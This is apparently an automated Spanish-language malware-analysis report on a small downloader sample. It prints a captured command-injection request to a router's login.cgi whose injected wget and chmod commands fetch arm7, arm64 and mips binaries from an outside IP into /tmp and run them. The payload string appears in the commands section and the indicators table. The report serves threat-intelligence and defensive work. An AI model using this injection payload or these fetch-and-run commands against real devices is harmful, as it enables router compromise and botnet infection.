# 🧬 Payload Analysis

`5a7f74e383063e05a8c97d64463e0925de77ec231c94815b66d52e20411e09c2`

## 📌 Resumen

Texto ASCII de 368 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `arm7` en `hxxp://85.11.167.XXX/arm7`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `chmod 777 /tmp/arm7`
2. `wget hxxp://85.11.167.XXX/arm64 -O /tmp/arm64`
3. `chmod 777 /tmp/arm64`
4. `wget hxxp://85.11.167.XXX/mips -O /tmp/mips`
5. `chmod 777 /tmp/mips`
6. `wget hxxp://85.11.167.XXX/arm7 -O /tmp/arm7` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Ficha malware:** [malware-like/oraculo/downloader/5a7f74e383063e05a8c97d64463e0925de77ec231c94815b66d52e20411e09c2.md](../../../../../malware-like/oraculo/downloader/5a7f74e383063e05a8c97d64463e0925de77ec231c94815b66d52e20411e09c2.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:40:04.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `5a7f74e383063e05a8c97d64463e0925de77ec231c94815b66d52e20411e09c2`
- **MD5:** `4807a2cbb0a0e10a6d58f8a447dd3a9d`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with very long lines (306), with CRLF line terminators |
| Tamaño | 368 B |
| Entropía | 5.02 |
| Strings | 4 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Cambio de permisos**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with very long lines (306), with CRLF line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
GET /login.cgi?cli=aa%20aa%27;wget%20http://85.11.167.XXX/arm7%20-O%20/tmp/arm7;chmod%20777%20/tmp/arm7;/tmp/arm7;wget%2
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://85.11.167.XXX/arm7%20-O%20/tmp/arm7;chmod%20777%20/tmp/arm7;/tmp/arm7;wget%20http://85.11.167.XXX/arm64%20-O%20/tmp/arm64;chmod%20777%20/tmp/arm64;/tmp/arm64;wget%20http://85.11.167.XXX/mips%20-O%20/tmp/mips;chmod%20777%20/tmp/mips;/tmp/mips%20dlink%27$ | strings |
| ip | 85.11.167.XXX | static_analysis |
| command | GET /login.cgi?cli=aa%20aa%27;wget%20http://85.11.167.XXX/arm7%20-O%20/tmp/arm7;chmod%20777%20/tmp/arm7;/tmp/arm7;wget%2 | strings |
| hash | 5a7f74e383063e05a8c97d64463e0925de77ec231c94815b66d52e20411e09c2 | static_analysis |
| ip | 45.41.105.XXX | artifact_source |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
